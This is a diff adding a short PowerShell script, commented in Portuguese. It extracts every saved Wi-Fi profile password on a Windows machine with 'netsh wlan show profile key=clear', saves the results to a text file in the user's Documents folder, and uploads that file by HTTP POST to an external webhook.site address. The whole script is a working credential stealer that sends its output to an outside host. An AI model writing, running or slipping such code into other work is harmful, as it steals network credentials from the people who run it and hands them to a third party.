@@ -1,0 +1,24 @@
+# Obter a pasta de documentos do usuário atual
+$documentPath = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::MyDocuments)
+
+# Definir o caminho completo para o arquivo de saída
+$outputFilePath = Join-Path -Path $documentPath -ChildPath "senhas_wifi.txt"
+
+# Executar o comando netsh para mostrar perfis Wi-Fi e salvar senhas no arquivo
+netsh wlan show profiles | Select-String "\:(.+)$" | ForEach-Object {
+    $name = $_.Matches.Groups[1].Value.Trim()
+    netsh wlan show profile name="$name" key=clear
+} | Out-File -FilePath $outputFilePath
+
+# Exibir mensagem de conclusão
+Write-Host "Senhas Wi-Fi foram salvas em $outputFilePath"
+
+# URL do webhook
+$webhookUrl = "https://webhook.site/ad629b45-838d-4dbc-ade4-9a4ef82a0879"
+
+# Enviar o arquivo para o webhook usando uma solicitação HTTP POST
+Invoke-RestMethod -Uri $webhookUrl -Method Post -InFile $outputFilePath
+
+# Exibir mensagem de conclusão
+Write-Host "Arquivo enviado para o webhook com sucesso."
+
